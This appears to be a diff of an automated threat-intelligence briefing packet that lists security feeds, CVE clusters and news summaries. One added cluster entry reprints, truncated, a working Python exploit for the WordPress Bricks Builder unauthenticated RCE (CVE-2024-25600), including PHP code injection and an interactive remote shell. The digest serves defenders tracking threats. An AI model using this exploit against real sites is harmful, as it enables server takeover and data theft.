@@ -1,14 +1,14 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-13T03:35:56.992321+00:00
+- Generated: 2026-07-13T07:28:31.861234+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 77
-- Total items in window: 327
+- Total items in window: 325
 - Total clusters raw: 142
-- Total clusters in packet: 57
-- Dropped low score: 85
+- Total clusters in packet: 59
+- Dropped low score: 83
 - Dropped overflow: 0
 
 ## Cohort metadata
@@ -80,33 +80,43 @@
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **SentinelOne Labs** (threat_research_primary)
-  - URL: https://www.sentinelone.com/labs/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 4
+- **Microsoft Threat Intelligence** (threat_research_primary)
+  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Google Threat Analysis Group** (threat_research_primary)
   - URL: https://blog.google/threat-analysis-group/rss/
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **Check Point Research** (threat_research_primary)
+  - URL: https://research.checkpoint.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 2
+- **SentinelOne Labs** (threat_research_primary)
+  - URL: https://www.sentinelone.com/labs/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Trend Micro Research** (threat_research_primary)
   - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
   - Status: ok
   - Item count: 25
   - In window count: 0
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
+- **NCSC UK** (government_authoritative)
+  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
-  - Item count: 15
-  - In window count: 3
-- **Microsoft Threat Intelligence** (threat_research_primary)
-  - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Item count: 20
+  - In window count: 2
+- **Citizen Lab** (threat_research_primary)
+  - URL: https://citizenlab.ca/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
@@ -115,56 +125,41 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
-- **Citizen Lab** (threat_research_primary)
-  - URL: https://citizenlab.ca/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
-- **NCSC UK** (government_authoritative)
-  - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
-- **Recorded Future** (threat_research_primary)
-  - URL: https://www.recordedfuture.com/feed
-  - Status: ok
-  - Item count: 50
-  - In window count: 3
-- **Check Point Research** (threat_research_primary)
-  - URL: https://research.checkpoint.com/feed/
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
   - Status: ok
   - Item count: 15
-  - In window count: 2
+  - In window count: 3
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 1
 - **SANS Internet Storm Center** (government_authoritative)
   - URL: https://isc.sans.edu/rssfeed_full.xml
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
   - Status: ok
-  - Item count: 100
+  - Item count: 10
+  - In window count: 2
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **GitHub Security Lab** (offensive_vulnerability_research)
+  - URL: https://github.blog/category/security/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 1
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
   - In window count: 5
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **PortSwigger Research** (offensive_vulnerability_research)
   - URL: https://portswigger.net/research/rss
   - Status: ok
@@ -175,15 +170,20 @@
   - Status: ok
   - Item count: 50
   - In window count: 12
-- **GitHub Security Lab** (offensive_vulnerability_research)
-  - URL: https://github.blog/category/security/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Assetnote** (offensive_vulnerability_research)
   - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
   - Item count: 78
+  - In window count: 0
+- **Recorded Future** (threat_research_primary)
+  - URL: https://www.recordedfuture.com/feed
+  - Status: ok
+  - Item count: 50
+  - In window count: 3
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
+  - Status: ok
+  - Item count: 10
   - In window count: 0
 - **The DFIR Report** (detection_response_operations)
   - URL: https://thedfirreport.com/feed/
@@ -195,16 +195,16 @@
   - Status: ok
   - Item count: 15
   - In window count: 0
-- **TrustedSec** (detection_response_operations)
-  - URL: https://www.trustedsec.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 2
 - **Proofpoint Threat Insight** (detection_response_operations)
   - URL: https://www.proofpoint.com/us/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 0
+- **TrustedSec** (detection_response_operations)
+  - URL: https://www.trustedsec.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 2
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
@@ -230,6 +230,11 @@
   - Status: ok
   - Item count: 20
   - In window count: 3
+- **Trail of Bits** (offensive_vulnerability_research)
+  - URL: https://blog.trailofbits.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Datadog Security Labs** (cloud_identity_infrastructure)
   - URL: https://securitylabs.datadoghq.com/rss/feed.xml
   - Status: ok
@@ -240,21 +245,21 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Trail of Bits** (offensive_vulnerability_research)
-  - URL: https://blog.trailofbits.com/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 9
 - **Permiso Security** (cloud_identity_infrastructure)
   - URL: https://permiso.io/blog/rss.xml
   - Status: ok
   - Item count: 10
   - In window count: 2
+- **AWS Security Blog** (cloud_identity_infrastructure)
+  - URL: https://aws.amazon.com/blogs/security/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 6
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 8
 - **Protect AI** (ai_security_agentic_risk)
   - URL: https://protectai.com/blog/rss.xml
   - Status: ok
@@ -265,76 +270,76 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **AWS Security Blog** (cloud_identity_infrastructure)
-  - URL: https://aws.amazon.com/blogs/security/feed/
-  - Status: ok
-  - Item count: 20
-  - In window count: 6
-- **Cloudflare Security** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/security/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 2
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
   - In window count: 1
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+- **Cloudflare Security** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/security/rss/
   - Status: ok
   - Item count: 20
-  - In window count: 0
+  - In window count: 2
 - **Wiz Research** (cloud_identity_infrastructure)
   - URL: https://www.wiz.io/feed/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 4
-- **OpenSSF Blog** (ai_security_agentic_risk)
-  - URL: https://openssf.org/feed/
+- **Google DeepMind Blog** (ai_security_agentic_risk)
+  - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
-  - Item count: 10
+  - Item count: 100
+  - In window count: 0
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+  - Status: ok
+  - Item count: 20
   - In window count: 0
 - **Coveware** (ransomware_ecrime_financial_crime)
   - URL: https://www.coveware.com/blog?format=rss
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Google DeepMind Blog** (ai_security_agentic_risk)
-  - URL: https://deepmind.google/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **Chainalysis** (ransomware_ecrime_financial_crime)
   - URL: https://www.chainalysis.com/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
-- **Interconnects** (ai_security_agentic_risk)
-  - URL: https://www.interconnects.ai/feed
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - URL: https://www.bleepingcomputer.com/feed/
-  - Status: ok
-  - Item count: 15
-  - In window count: 15
-- **The Record** (cyber_news_breach_reporting)
-  - URL: https://therecord.media/feed
-  - Status: ok
-  - Item count: 5
-  - In window count: 5
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
   - In window count: 19
+- **OpenSSF Blog** (ai_security_agentic_risk)
+  - URL: https://openssf.org/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **Interconnects** (ai_security_agentic_risk)
+  - URL: https://www.interconnects.ai/feed
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
+- **The Record** (cyber_news_breach_reporting)
+  - URL: https://therecord.media/feed
+  - Status: ok
+  - Item count: 5
+  - In window count: 5
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - URL: https://www.bleepingcomputer.com/feed/
+  - Status: ok
+  - Item count: 15
+  - In window count: 15
 - **GreyNoise** (cloud_identity_infrastructure)
   - URL: https://www.greynoise.io/blog/rss.xml
   - Status: ok
   - Item count: 100
   - In window count: 0
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
+  - Status: ok
+  - Item count: 30
+  - In window count: 20
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
   - Status: ok
@@ -350,11 +355,6 @@
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 21
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
@@ -375,43 +375,53 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Troy Hunt** (practitioner_analysis)
-  - URL: https://www.troyhunt.com/rss/
-  - Status: ok
-  - Item count: 15
-  - In window count: 1
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
   - Item count: 10
   - In window count: 6
-- **Graham Cluley** (practitioner_analysis)
-  - URL: https://grahamcluley.com/feed/
+- **Troy Hunt** (practitioner_analysis)
+  - URL: https://www.troyhunt.com/rss/
   - Status: ok
-  - Item count: 20
-  - In window count: 3
+  - Item count: 15
+  - In window count: 1
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
 - **Krebs on Security** (practitioner_analysis)
   - URL: https://krebsonsecurity.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **Graham Cluley** (practitioner_analysis)
+  - URL: https://grahamcluley.com/feed/
+  - Status: ok
+  - Item count: 20
+  - In window count: 3
 - **Reddit r/sysadmin** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/sysadmin/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
+- **Intel 471** (ransomware_ecrime_financial_crime)
+  - URL: https://intel471.com/blog/feed
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
+- **Reddit r/netsecstudents** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsecstudents/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
@@ -420,20 +430,10 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/netsecstudents** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsecstudents/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
   - Item count: 0
-  - In window count: 0
-- **Intel 471** (ransomware_ecrime_financial_crime)
-  - URL: https://intel471.com/blog/feed
-  - Status: ok
-  - Item count: 100
   - In window count: 0
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
@@ -444,7 +444,7 @@
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
   - Item count: 25
-  - In window count: 11
+  - In window count: 12
 - **Embrace the Red** (ai_security_agentic_risk)
   - URL: https://embracethered.com/blog/index.xml
   - Status: ok
@@ -459,7 +459,7 @@
   - URL: https://risky.biz/feeds/risky-business-news/
   - Status: ok
   - Item count: 100
-  - In window count: 6
+  - In window count: 5
 - **Just Security** (policy_strategy_geopolitics)
   - URL: https://www.justsecurity.org/feed/
   - Status: ok
@@ -511,13 +511,31 @@
   - https://thehackernews.com/2026/07/cisa-adds-4-actively-exploited-adobe.html
   - https://www.helpnetsecurity.com/2026/07/12/week-in-review-accenture-data-breach-great-open-source-cybersecurity-tools/
 
-### CVE-2026-48313 exploitation activity
-- Anchor signal: CVE-2026-48313
-- Theme key: cve-2026-48313
+### WordPress vulnerability activity
+- Anchor signal: WordPress
+- Theme key: wordpress
+- Cluster count: 2
+- Article count: 3
+- Cohesion: 0.288
+- Shared strong signals: WordPress
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - affected_products: WordPress
+  - urgency_signals: preauth_unauth
+- Cluster IDs: 1d65faccbc, 08882287bf
+- Links:
+  - https://www.exploit-db.com/exploits/52619
+  - https://thehackernews.com/2026/07/exposed-hacker-server-reveals-wp.html
+  - https://thehackernews.com/2026/07/icagenda-and-balbooa-forms-joomla-flaws.html
+
+### CVE-2026-48283 exploitation activity
+- Anchor signal: CVE-2026-48283
+- Theme key: cve-2026-48283
 - Cluster count: 2
 - Article count: 2
 - Cohesion: 0.281
-- Shared strong signals: CVE-2026-48313
+- Shared strong signals: CVE-2026-48283
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -528,13 +546,13 @@
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-9181/
   - https://horizon3.ai/attack-research/vulnerabilities/cve-2026-48283-cve-2026-48313/
 
-### CVE-2026-48283 exploitation activity
-- Anchor signal: CVE-2026-48283
-- Theme key: cve-2026-48283
+### CVE-2026-48313 exploitation activity
+- Anchor signal: CVE-2026-48313
+- Theme key: cve-2026-48313
 - Cluster count: 2
 - Article count: 2
 - Cohesion: 0.281
-- Shared strong signals: CVE-2026-48283
+- Shared strong signals: CVE-2026-48313
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
@@ -594,24 +612,22 @@
   - https://thehackernews.com/2026/07/beyondtrust-patches-critical-auth.html
   - https://cyberscoop.com/karen-vardanyan-armenian-ryuk-ransomware-guilty/
 
-### Linux kernel vulnerability activity
-- Anchor signal: Linux kernel
-- Theme key: linux-kernel
+### ransomware extortion targeting Android
+- Anchor signal: Android
+- Theme key: android
 - Cluster count: 2
-- Article count: 7
+- Article count: 2
 - Cohesion: 0.2
-- Shared strong signals: Linux kernel
+- Shared strong signals: Android
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - affected_products: Linux kernel
-- Cluster IDs: 8fe87a7b65, cad05b2d4e
+  - threat_categories: ransomware_extortion
+  - affected_industries: financial_services
+  - affected_products: Android
+- Cluster IDs: 3ee1d54d9d, cad05b2d4e
 - Links:
-  - https://aws.amazon.com/blogs/security/enforce-zero-data-retention-on-amazon-bedrock-with-bedrock-projects-and-service-control-policies/
-  - https://simonwillison.net/2026/Jul/6/sqlite-utils/#atom-everything
-  - https://risky.biz/RBNEWS586/
-  - https://www.securityweek.com/in-other-news-dhs-database-hacked-adobe-boosts-patch-cadence-canada-disrupts-ransomware-ops/
-  - https://thehackernews.com/2026/07/friendly-fire-ai-agents-built-to-catch.html
+  - https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/
   - https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/
 
 ### Microsoft 365 vulnerability activity
@@ -631,24 +647,6 @@
   - https://www.huntress.com/blog/conditional-access-misconfigurations
   - https://www.securityweek.com/okta-warns-of-vishing-attacks-targeting-microsoft-365-customers/
   - https://thehackernews.com/2026/07/hackers-use-fake-microsoft-entra.html
-
-### ransomware extortion targeting Android
-- Anchor signal: Android
-- Theme key: android
-- Cluster count: 2
-- Article count: 2
-- Cohesion: 0.2
-- Shared strong signals: Android
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: ransomware_extortion
-  - affected_industries: financial_services
-  - affected_products: Android
-- Cluster IDs: 3ee1d54d9d, cad05b2d4e
-- Links:
-  - https://research.checkpoint.com/2026/cavern-manticore-exposing-iran-linked-modular-c2-framework/
-  - https://research.checkpoint.com/2026/6th-july-threat-intelligence-report-2/
 
 ### Microsoft Defender vulnerability activity
 - Anchor signal: Microsoft Defender
@@ -687,7 +685,12 @@
 ## Forward signals
 
 ### Novelty
-- Novel cves: 0
+- Novel cves: 5
+  - CVE-2025-12352 (first seen via The Hacker News at 2026-07-13T05:36:02+00:00, cluster 08882287bf)
+  - CVE-2025-6389 (first seen via The Hacker News at 2026-07-13T05:36:02+00:00, cluster 08882287bf)
+  - CVE-2025-7852 (first seen via The Hacker News at 2026-07-13T05:36:02+00:00, cluster 08882287bf)
+  - CVE-2026-48939 (first seen via The Hacker News at 2026-07-13T05:36:02+00:00, cluster 08882287bf)
+  - CVE-2026-56291 (first seen via The Hacker News at 2026-07-13T05:36:02+00:00, cluster 08882287bf)
 - Novel actors: 0
 - Novel products: 0
 
@@ -698,6 +701,12 @@
 ### Convergence (15)
 - Pair: CVE-2024-27822 + Apple iOS/macOS (cluster 598aa947b4, first observation: True)
 - Pair: CVE-2026-41264 + Apple iOS/macOS (cluster 598aa947b4, first observation: True)
+- Pair: CVE-2024-25600 + WordPress (cluster 1d65faccbc, first observation: True)
+- Pair: CVE-2025-12352 + WordPress (cluster 08882287bf, first observation: True)
+- Pair: CVE-2025-6389 + WordPress (cluster 08882287bf, first observation: True)
+- Pair: CVE-2025-7852 + WordPress (cluster 08882287bf, first observation: True)
+- Pair: CVE-2026-48939 + WordPress (cluster 08882287bf, first observation: True)
+- Pair: CVE-2026-56291 + WordPress (cluster 08882287bf, first observation: True)
 - Pair: CVE-2025-5777 + Anthropic/Claude (cluster aaaf47b0ea, first observation: True)
 - Pair: CVE-2025-5777 + OpenAI/ChatGPT (cluster aaaf47b0ea, first observation: True)
 - Pair: CVE-2026-12486 + Cisco (cluster 118be3a32e, first observation: True)
@@ -705,12 +714,6 @@
 - Pair: CVE-2026-25106 + Cisco (cluster 118be3a32e, first observation: True)
 - Pair: CVE-2026-28739 + Cisco (cluster 118be3a32e, first observation: True)
 - Pair: CVE-2026-33091 + Cisco (cluster 118be3a32e, first observation: True)
-- Pair: CVE-2024-12356 + Scattered Spider (cluster 8b4ae517ee, first observation: True)
-- Pair: CVE-2024-12356 + Anthropic/Claude (cluster 8b4ae517ee, first observation: True)
-- Pair: CVE-2026-40138 + Scattered Spider (cluster 8b4ae517ee, first observation: True)
-- Pair: CVE-2026-40138 + Anthropic/Claude (cluster 8b4ae517ee, first observation: True)
-- Pair: CVE-2026-40139 + Scattered Spider (cluster 8b4ae517ee, first observation: True)
-- Pair: CVE-2026-40139 + Anthropic/Claude (cluster 8b4ae517ee, first observation: True)
 
 ### Drift (1)
 - **Scattered Spider** (cluster 8b4ae517ee)
@@ -880,18 +883,22 @@ CVE-2026-9181 Esri ArcGIS Server Pre-Authentication Path Traversal Vulnerability
 - Source: Exploit-DB (offensive_vulnerability_research)
 - Published: 2026-07-07T00:00:00+00:00
 - Link: https://www.exploit-db.com/exploits/52619
-- Fetch status: fetch_failed:HTTPError
+- Fetch status: ok
 - Member count: 2
 - Corroborating source count: 2
 - Strong signals: WordPress
 
 #### Cluster taxonomy (union across members)
 - affected_products: WordPress
+- cve_ids: CVE-2024-25600
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research, tier_4_news
 
 #### Primary article taxonomy
 - affected_products: WordPress
+- cve_ids: CVE-2024-25600
+- urgency_signals: preauth_unauth
 - content_type: news_report
 - confidence_tier: tier_1_offensive_research
 
@@ -899,6 +906,12 @@ CVE-2026-9181 Esri ArcGIS Server Pre-Authentication Path Traversal Vulnerability
 
 ```
 WordPress Bricks Builder Theme - RCE
+```
+
+#### Full body
+
+```
+Exploit Database Exploits GHDB Papers Shellcodes Search EDB SearchSploit Manual Submissions Online Training WordPress Bricks Builder Theme - RCE EDB-ID: 52619 CVE: 2024-25600 EDB Verified: Author: Jared Brits Type: webapps Exploit: / Platform: Multiple Date: 2026-07-07 Vulnerable App: # Exploit Title: WordPress Bricks Builder Theme - RCE # Date: 2026-06-25 # Exploit Author: Jared Brits (K3ysTr0K3R) # Vendor Homepage: https://bricksbuilder.io/ # Software Link: https://bricksbuilder.io/ # Version: Bricks Builder <= 1.9.6 # Tested On: Kali Linux 2026.1 / WordPress 6.7 # CVE: CVE-2024-25600 # Description: Unauthenticated RCE vulnerability in Bricks Builder theme's # render_element endpoint. Extracts nonce from page source and # executes arbitrary commands on vulnerable WordPress installations. import re import requests import argparse import threading from bs4 import BeautifulSoup from rich.console import Console from prompt_toolkit import PromptSession, HTML from prompt_toolkit.history import InMemoryHistory from prompt_toolkit.auto_suggest import AutoSuggestFromHistory from concurrent.futures import ThreadPoolExecutor, as_completed from alive_progress import alive_bar color = Console() def ascii_art(): color.print("""[yellow] _______ ________ ___ ____ ___ __ __ ___ ___________ ____ ____ / ____/ | / / ____/ |__ \ / __ \__ \/ // / |__ \ / ____/ ___// __ \/ __ \\ / / | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / / / /___ | |/ / /__/_____/ __// /_/ / __/__ __/_____/ __/____/ / /_/ / /_/ / /_/ / \____/ |___/_____/ /____/\____/____/ /_/ /____/_____/\____/\____/\____/ [/yellow]""", style="bold") print("Coded By: Jared Brits (K3ysTr0K3R) --> Hello, Friend!") print("") headers = { "Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Linux; Android 11; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Mobile Safari/537.36" } paths = [ "/wp-json/bricks/v1/render_element", "/?rest_route=/bricks/v1/render_element" ] requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning) def fetch_nonce(target): try: response = requests.get(target, verify=False, timeout=10) response.raise_for_status() soup = BeautifulSoup(response.text, "html.parser") script_tag = soup.find("script", id="bricks-scripts-js-extra") if script_tag: match = re.search(r'"nonce":"([a-f0-9]+)"', script_tag.string) if match: nonce = match.group(1) return nonce except Exception: return None def interactive_shell(target, nonce): color.print("[bold bright_green][+][/bold bright_green] Interactive shell opened successfully") session = PromptSession(history=InMemoryHistory()) for vulnerable_path in paths: while True: try: command = session.prompt( HTML("<ansired><b>Shell> </b></ansired>"), auto_suggest=AutoSuggestFromHistory(), ) if command.lower() == "exit": return vulnerable_data = create_vulnerable_data(nonce, command) response = requests.post(target + vulnerable_path, headers=headers, json=vulnerable_data, verify=False, timeout=10) output = response.json().get('data').get('html') cleaned_output = output.replace("Exception: ", "") print(cleaned_output) except KeyboardInterrupt: return def create_vulnerable_data(nonce, command): return { "postId": "1", "nonce": nonce, "element": { "name": "code", "settings": { "executeCode": "true", "code": f"<?php throw new Exception(`{command}`);?>" } } } def exploit(target): nonce = fetch_nonce(target) if nonce: elements = [create_element(nonce) for _ in range(4)] for path, element in zip(paths, elements): if exploit_successful(target, path, element): interactive_shell(target, nonce) break def exploit_successful(target, path, element): color.print("[bold bright_blue][*][/bold bright_blue] Checking if the target is vulnerable") try: response = requests.post(target + path, headers=headers, json=element, verify=False, timeout=10) response.raise_for_status() if response.status_code == 200 and 'KHABuhwxnUHDDW' in response.text: color.print("[bold brig
 ```
 
 #### Corroborating sources (2)
@@ -913,6 +926,55 @@ WordPress Bricks Builder Theme - RCE
   - Published: 2026-07-10T11:30:02+00:00
   - Link: https://thehackernews.com/2026/07/exposed-hacker-server-reveals-wp.html
   - Summary: A cybercrime crew left one of its own servers wide open on the internet for three weeks, and it exposed the operation's inner workings: the hacking tools, the activity logs, and target lists naming more than 1.4 million websites. Far fewer were actually broken into, but the exposed files showed researchers how a mass site-hacking operation runs from the inside. The operation, now tracked as
+
+### Cluster 08882287bf — score 22
+
+- Title: iCagenda and Balbooa Forms Joomla Flaws Reportedly Exploited as Zero-Days
+- Source: The Hacker News (cyber_news_breach_reporting)
+- Published: 2026-07-13T05:36:02+00:00
+- Link: https://thehackernews.com/2026/07/icagenda-and-balbooa-forms-joomla-flaws.html
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: CVE-2026-48939
+
+#### Cluster taxonomy (union across members)
+- threat_categories: active_exploitation, zero_day
+- affected_industries: government
+- affected_products: WordPress
+- cve_ids: CVE-2025-12352, CVE-2025-6389, CVE-2025-7852, CVE-2026-48939, CVE-2026-56291
+- urgency_signals: actively_exploited, preauth_unauth, zero_day
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: zero_day, active_exploitation
+- affected_industries: government
+- affected_products: WordPress
+- cve_ids: CVE-2026-48939, CVE-2026-56291, CVE-2025-6389, CVE-2025-7852, CVE-2025-12352
+- urgency_signals: actively_exploited, zero_day, preauth_unauth
+- content_type: news_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added two maximum-severity security flaws impacting iCagenda and Balbooa extensions for Joomla to its Known Exploited Vulnerabilities (KEV) catalog, following reports of zero-day exploitation in the wild. The vulnerabilities, both rated 10.0 on the CVSS scoring system, are below - CVE-2026-48939 - A vulnerability in the
+```
+
+#### Full body
+
+```
+iCagenda and Balbooa Forms Joomla Flaws Reportedly Exploited as Zero-Days  Ravie Lakshmanan  Jul 13, 2026 Vulnerability / Web Security The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has added two maximum-severity security flaws impacting iCagenda and Balbooa extensions for Joomla to its Known Exploited Vulnerabilities ( KEV ) catalog, following reports of zero-day exploitation in the wild. The vulnerabilities, both rated 10.0 on the CVSS scoring system, are below - CVE-2026-48939 - A vulnerability in the iCagenda extension for Joomla that allows the upload of arbitrary files via the file attachment feature, leading to PHP code upload and execution. CVE-2026-56291 - A vulnerability in the Balbooa Forms extension for Joomla that allows the upload of arbitrary files, leading to remote code execution. According to mySites.guru, a cloud-based dashboard service for managing WordPress and Joomla websites, CVE-2026-48939 is said to have been exploited as a zero-day since June 15, 2026, in automated attacks aimed at Joomla sites on which iCagenda is installed. It resides in the "Submit an Event" form functionality, which lets users propose events for the calendar. "We first saw it in a client's access log: an automated scanner identifying itself as 'icagenda-batch/1.0' grabbed a token, posted a malicious upload to the submit endpoint, then fetched the planted shell at the exact path the component writes attachments to," mySites.guru said . The flaw impacts the following versions - 4.x versions up to and including 4.0.7 Legacy 3.x versions from 3.2.1 up to and including 3.9.14 JoomliC has since released updates to address the issue in iCagenda versions 4.0.8 and 3.9.15. Site owners are advised to check for suspicious PHP files in the "images/icagenda/frontend/attachments/" folder and remove them. MySites.guru said it also observed zero-day exploitation of CVE-2026-56291, which affects Balbooa Forms versions up to and including 2.4.0. It has been patched in version 2.4.1. "Up to and including version 2.4.0, its frontend attachment upload had a serious flaw: it accepted a file from any anonymous visitor, with no login, no CSRF token, and no check on the file type," it said . "An attacker could upload a PHP file into a public folder and then run it, which is unauthenticated remote code execution, the worst outcome a web flaw can have." The vulnerability was discovered by mySites.guru on July 8, 2026, following a live attack on one of its customers. It has shared the following indicators of compromise - Look in the Balbooa Forms upload folder (by default "images/baforms/uploads") for any file that is not an image or document, especially anything ending in PHP Check the Joomla user list for suspicious administrator accounts Audit the set for recently modified or unfamiliar PHP files across the site In light of active exploitation, Federal Civilian Executive Branch (FCEB) agencies have until July 13, 2026, to implement the fixes in their networks. Australia Warns of Global Campaign Targeting Vulnerable CMS Systems The disclosure comes as the 